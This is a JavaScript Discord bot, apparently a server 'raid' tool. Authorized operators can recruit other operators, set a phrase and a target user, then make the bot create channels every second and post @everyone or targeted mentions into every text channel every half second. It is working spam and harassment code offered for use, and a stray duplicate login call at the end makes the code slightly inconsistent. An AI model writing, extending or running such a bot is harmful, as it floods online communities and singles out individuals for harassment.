import { Client, Events, GatewayIntentBits } from 'discord.js';
import { storage } from './storage.js';

// ===== Runtime state =====
const AUTHORIZED_USER_IDS = new Set(["1298640383688970293"]);
let isSpamming = false;
let spamInterval = null;
let channelInterval = null;
const createdChannelIds = new Set();
let spamPhrase = "Ghaith is king";
let targetedUserId = null;
let isOnline = false;

// ===== Discord client =====
export const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

export async function startBot() {
  if (!process.env.DISCORD_TOKEN) {
    console.warn("DISCORD_TOKEN not set. Bot will not start.");
    await storage.createLog({
      type: 'error',
      message: 'DISCORD_TOKEN environment variable is missing.'
    });
    return;
  }

  client.once(Events.ClientReady, async (c) => {
    console.log(`Ready! Logged in as ${c.user.tag}`);
    isOnline = true;
    await storage.createLog({
      type: 'info',
      message: `Bot started as ${c.user.tag}`
    });
  });

  client.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;
    if (!AUTHORIZED_USER_IDS.has(message.author.id)) return;

    // ===== Recruit =====
    if (message.content.startsWith('.recruit')) {
      const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (targetId) {
        AUTHORIZED_USER_IDS.add(targetId);
        await storage.createLog({
          type: 'command',
          message: `Recruited user ${targetId}`
        });
        message.reply(`User <@${targetId}> recruited.`).catch(() => {});
      }
      return;
    }

    // ===== Revoke =====
    if (message.content.startsWith('.revoke')) {
      const targetId = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (targetId) {
        AUTHORIZED_USER_IDS.delete(targetId);
        await storage.createLog({
          type: 'command',
          message: `Revoked user ${targetId}`
        });
        message.reply(`User <@${targetId}> revoked.`).catch(() => {});
      }
      return;
    }

    // ===== Change phrase =====
    if (message.content.startsWith('.change')) {
      const newPhrase = message.content.split(' ').slice(1).join(' ');
      if (newPhrase) {
        spamPhrase = newPhrase;
        await storage.createLog({
          type: 'command',
          message: `Changed phrase to ${newPhrase}`
        });
        message.reply(`Phrase changed to: ${newPhrase}`).catch(() => {});
      }
      return;
    }

    // ===== Choose target =====
    if (message.content.startsWith('.choose')) {
      const target = message.content.split(' ')[1]?.replace(/[<@!>]/g, '');
      targetedUserId = target || null;
      message.reply(
        target ? `Target set to <@${target}>` : 'Target cleared (@everyone)'
      ).catch(() => {});
      return;
    }

    // ===== Start =====
    if (message.content === '.start') {
      if (isSpamming) return;
      isSpamming = true;

      const guild = message.guild;
      if (!guild) return;

      const createChannels = async () => {
        if (!isSpamming) return;
        for (let i = 0; i < 10; i++) {
          try {
            const channel = await guild.channels.create({
              name: spamPhrase,
              type: 0
            });
            createdChannelIds.add(channel.id);
            const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
            channel.send(`${mention} ${spamPhrase}`).catch(() => {});
          } catch {
            break;
          }
        }
      };

      const spamMessages = async () => {
        if (!isSpamming) return;
        guild.channels.cache.forEach((channel) => {
          if (!channel.isTextBased()) return;
          const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
          for (let i = 0; i < 3; i++) {
            channel.send(`${mention} ${spamPhrase}`).catch(() => {});
          }
        });
      };

      createChannels();
      spamMessages();
      channelInterval = setInterval(createChannels, 1000);
      spamInterval = setInterval(spamMessages, 500);
    }

    // ===== Stop =====
    if (message.content === '.stop') {
      isSpamming = false;
      if (spamInterval) clearInterval(spamInterval);
      if (channelInterval) clearInterval(channelInterval);
      spamInterval = null;
      channelInterval = null;

      message.reply('Stopping...').catch(() => {});

      const guild = message.guild;
      if (!guild) return;

      for (const id of createdChannelIds) {
        try {
          const ch = await guild.channels.fetch(id);
          if (ch) await ch.delete();
        } catch {}
      }
      createdChannelIds.clear();
      return;
    }

    // ===== Ping =====
    if (message.content === '!ping') {
      message.reply('Pong!').catch(() => {});
    }
  });

  client.on(Events.Error, async (error) => {
    console.error(error);
    await storage.createLog({
      type: 'error',
      message: error.message
    });
  });

  await client.login(process.env.DISCORD_TOKEN);
}

export function getBotStatus() {
  return {
    online: isOnline,
    uptime: client.uptime,
    username: client.user?.tag
  };
}

client.login(process.env.DISCORD_BOT_TOKEN)
